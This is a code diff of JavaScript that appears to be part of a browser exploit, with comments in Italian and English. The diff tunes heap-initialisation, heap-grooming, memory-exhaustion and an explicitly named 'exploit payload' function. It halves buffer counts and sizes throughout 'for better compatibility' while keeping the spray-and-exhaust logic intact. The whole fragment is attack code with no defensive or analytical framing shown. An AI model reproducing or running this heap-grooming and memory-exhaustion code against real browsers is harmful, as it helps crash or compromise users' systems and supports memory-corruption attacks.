@@ -142,8 +142,8 @@ function q1() {
 // Passo 1: Inizializza la memoria controllata
 function initializeHeap() {
     let buffers = [];
-    for (let i = 0; i < 1024; i++) { // Reduced for better compatibility
-        buffers.push(new ArrayBuffer(250000)); // Reduced for better compatibility
+    for (let i = 0; i < 512; i++) { // Reduced for better compatibility
+        buffers.push(new ArrayBuffer(125000)); // Reduced for better compatibility
     }
     return buffers;
 }
@@ -152,12 +152,12 @@ function initializeHeap() {
 function groomHeap() {
     let tempArray = [];
 
-    for (let i = 0; i < 1024; i++) { // Reduced for better compatibility
-        let buffer = new ArrayBuffer(500); // Reduced for better compatibility
+    for (let i = 0; i < 512; i++) { // Reduced for better compatibility
+        let buffer = new ArrayBuffer(250); // Reduced for better compatibility
         tempArray.push(buffer);
     }
 
-    for (let i = 0; i < 756; i++) { // Reduced for better compatibility
+    for (let i = 0; i < 378; i++) { // Reduced for better compatibility
         tempArray[i] = null;
     }
 
@@ -167,9 +167,9 @@ function groomHeap() {
 // Step 3: Memory Exhaustion Function
 function memExh() {
     let bufferArray = [];
-    for (let i = 0; i < 1024; i++) { // Reduced for better compatibility
-        bufferArray.push(new ArrayBuffer(450000)); // Reduced for better compatibility
-        if (bufferArray.length > 256) { // Reduced for better compatibility
+    for (let i = 0; i < 512; i++) { // Reduced for better compatibility
+        bufferArray.push(new ArrayBuffer(225000)); // Reduced for better compatibility
+        if (bufferArray.length > 128) { // Reduced for better compatibility
             bufferArray = [];
         }
     }
@@ -177,18 +177,18 @@ function memExh() {
 
 // Step 4: The Exploit Payload Function
 function payload() {
-    let largeString = "B".repeat(450000); // Reduced for better compatibility
+    let largeString = "B".repeat(225000); // Reduced for better compatibility
     let obj = {};
     let iterationCount = 0;
 
     while (true) {
         largeString += largeString;
-        if (largeString.length > 50000000) { // Reduced for better compatibility
-            largeString = "B".repeat(450000); // Reduced for better compatibility
+        if (largeString.length > 25000000) { // Reduced for better compatibility
+            largeString = "B".repeat(225000); // Reduced for better compatibility
         }
         memExh();
         iterationCount++;
-        if (iterationCount > 32) break; // Reduced for better compatibility
+        if (iterationCount > 16) break; // Reduced for better compatibility
     }
 }
 
